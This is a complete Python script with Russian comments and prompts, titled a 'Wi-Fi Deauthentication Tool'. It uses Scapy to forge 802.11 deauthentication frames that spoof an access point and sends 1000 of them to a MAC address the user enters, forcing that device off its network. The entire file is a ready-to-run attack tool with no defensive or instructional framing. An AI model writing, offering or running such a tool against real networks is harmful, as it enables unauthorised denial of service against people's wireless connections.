from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def deauth(target_mac, ap_mac, iface):
    """Функция для отправки deauthentication пакетов."""
    dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    print(f"[INFO] Отправка deauth пакетов на {target_mac} через {iface}")
    sendp(packet, iface=iface, count=1000, inter=0.1)
    print("[INFO] Завершено!")

def main():
    print("=== Wi-Fi Deauthentication Tool ===")
    print("Введите параметры для атаки:")
    
    # Считывание параметров от пользователя
    target_mac = input("Цель (MAC-адрес): ").strip()
    ap_mac = input("Точка доступа (MAC-адрес): ").strip()
    iface = input("Интерфейс (например, wlan0mon): ").strip()
    
    # Проверка введённых данных
    if not target_mac or not ap_mac or not iface:
        print("[ERROR] Все поля обязательны!")
        return
    
    # Подтверждение и запуск атаки
    print(f"\n[INFO] Настройки:")
    print(f"Цель: {target_mac}")
    print(f"Точка доступа: {ap_mac}")
    print(f"Интерфейс: {iface}")
    
    confirm = input("Подтвердить? (yes/no): ").strip().lower()
    if confirm == "yes":
        deauth(target_mac, ap_mac, iface)
    else:
        print("[INFO] Операция отменена.")

if __name__ == "__main__":
    main()
